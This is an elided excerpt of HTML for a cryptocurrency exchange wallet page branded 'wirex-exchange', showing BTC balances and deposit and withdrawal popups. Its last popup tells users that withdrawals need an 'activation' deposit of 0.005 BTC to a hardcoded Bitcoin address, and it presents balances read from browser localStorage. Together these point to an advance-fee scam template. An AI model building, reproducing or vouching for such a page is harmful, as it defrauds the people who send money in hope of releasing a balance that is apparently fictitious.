 ...
 .popup-background {
    ...
    .copier-container {
        ...
        .WEE {
            ...
            outline: none;
            width: calc(70% - 10px); /* Adjusted width */
            margin-bottom: 10px;
  ...
  <div class="row content">
    ...
    <div class="wallet__menu-item wallet__gift">
      <a href="#" class="wallet__menu-link">
          ...
          <span class="wallet__menu-link__text" id="Pop-up"><a href="#" id="popupToggle1">Voucher</a></span>
      </a>
  </div>
...
<div id="btcBalance" class="bal"> <b><span id="btcBalanceValue" >0</span> BTC</b></div>
     ...
     <h1>Account Balances</h1>
      <div class="row">
        <div class="col-sm-3">
          <div class="well">
            <a href="#" onclick="showCustomPopup()"> <button class="button4 id="custom-depositbtn"><span>Deposit </span></button></a>
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      ...
      <div id="btcBalance" class="" style="font-size: medium;"> <span id="btcBalanceValue2" >0</span> BTC</div>
      <div class="buttons">
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      <div class="asset-details">
        <img width="64" height="64" src="https://img.icons8.com/nolan/64/ethereum.png" alt="ethereum"/>
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      <div class="asset-details">
        <img width="48" height="48" src="https://img.icons8.com/fluency/48/ripple.png" alt="ripple"/>
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      <div class="asset-details">
        <img width="64" height="64" src="https://img.icons8.com/external-black-fill-lafs/64/external-Bitcoin-Cash-cryptocurrency-black-fill-lafs.png" alt="external-Bitcoin-Cash-cryptocurrency-black-fill-lafs"/>
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      <div class="asset-details">
        <img width="64" height="64" src="https://img.icons8.com/dusk/64/binance.png" alt="binance"/>
...
<div class="container">
  <ul class="asset-list">
    <li class="asset-item">
      <div class="asset-details">
        <img width="48" height="48" src="https://img.icons8.com/fluency/48/cardano.png" alt="cardano"/>
...
<div id="custom-popupBackground" class="custom-popup-background">
  ...
  <div id="custom-popup" class="custom-popup">
      ...
      <button id="custom-copyButton" class="custom-copy-button" style="display: none;" onclick="copyToClipboard()">Copy</button>
  </div>
</div>
 ...
 var btcBalance = localStorage.getItem('btcBalance');
  ...
  <div class="popup" id="withdrawPopup">
    <div class="popup-content">
      ...
      <img src="images/bit.png" alt="Image" style="display:block; margin: 0 auto; width: 170px; height: auto;">
  ...
  <div class="popup" id="additionalPopup">
    <div class="popup-content">
        ...
        <img src="images/bitcon.png" alt="Image" style="display:block; margin: 0 auto; width: 170px; height: auto;">
  ...
  <div class="popup" id="finalPopup">
    <div class="popup-content">
      ...
      <img src="images/cancel.png" alt="Image" style="display:block; margin: 0 auto; width: 170px; height: auto;">
      <p style="color: red;font-weight: bolder;">To withdraw funds to a third-party address, you need to activate your account. To activate the account, make a minimum deposit of 0.005 BTC. The deposit can also be withdrawn after account activation.</p>
      <p><b><i>Your deposit: 0 / 0.005 BTC.</i></b></p>

        <div class="copier-container">
          <input type="text" id="bitcoinAddress" class="WEE" value="bc1qc2vv8mv3r3gj2ffplpj70nrt9vjsgdc9r4yu53" readonly onclick="copyBitcoinAddress()">
      </div>
...
<script src="depjs.js"></script>
 <div class="footer">
  <p>&copy; 2024 wirex-exchange. All rights reserved.</p>
 </div>
